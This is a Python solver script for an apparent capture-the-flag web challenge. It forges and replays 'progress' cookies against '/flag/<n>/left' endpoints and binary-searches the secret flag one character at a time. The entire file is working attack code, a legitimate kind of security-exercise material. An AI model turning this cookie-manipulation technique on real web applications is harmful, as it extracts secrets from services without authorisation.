import requests
import sys 

if len(sys.argv) > 1: url = f"{sys.argv[1]}/flag"
else: url = 'http://localhost:5000/flag'

print (url)

flag = ''
key = ''
counter = 0
legal = '0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}'
MIN = 0
MAX = len(legal) - 1

def ord(c):
    return legal.index(c)    

def chr(i):
    return legal[i]

print (chr(MIN), chr((MAX + MIN) // 2), chr(MAX))
print (ord('b'))

def search(key):
    low = MIN
    high = MAX

    for move in key:
        mid = (low + high) // 2

        # print (low, mid, high)
        if ord(move) % 2 == 0:
            high = mid
        elif ord(move) % 2 == 1:
            low = mid + 1
        else:
            raise ValueError('fuck')

    if low != high:
        return 0
    return low


resp = requests.get(f"{url}/{counter}", cookies={'progress': key})
while not 'Success!' in resp.text:
    resp = requests.get(f"{url}/{counter}/left", cookies={'progress': key}, allow_redirects=False)
    cookies = resp.cookies
    print (resp.status_code, cookies)

    if resp.status_code == 302:
        key += cookies['progress'][-1]
    else: 
            tmp = ord(cookies['progress'][-1]) + 1
            if tmp == MAX + 1: tmp = MIN
            key += chr(tmp)
    # print (key)
    resp = requests.get(f"{url}/{counter}", cookies={'progress': key})
    if 'Fail' in resp.text: raise Error('Fuck')

flag += chr(search(key))
key = ''
counter += 1
while flag[-1] != '}':
    resp = requests.get(url)
    while not 'Success!' in resp.text:
        resp = requests.get(f"{url}/{counter}/left", cookies={'progress': key}, allow_redirects=False)
        cookies = resp.cookies
        print (resp.status_code, cookies)


        if len(cookies['progress']) > 10: raise ValueError('key too long')

        if resp.status_code == 302:
            key += cookies['progress'][-1]
        else: 
            tmp = ord(cookies['progress'][-1]) + 1
            if tmp == MAX + 1: tmp = MIN
            key += chr(tmp)
        print (key)
        resp = requests.get(f"{url}/{counter}", cookies={'progress': key})
        if 'Fail' in resp.text: raise ValueError('Fuck')
    
    flag += chr(search(key))
    print (flag)
    key = ''
    counter += 1 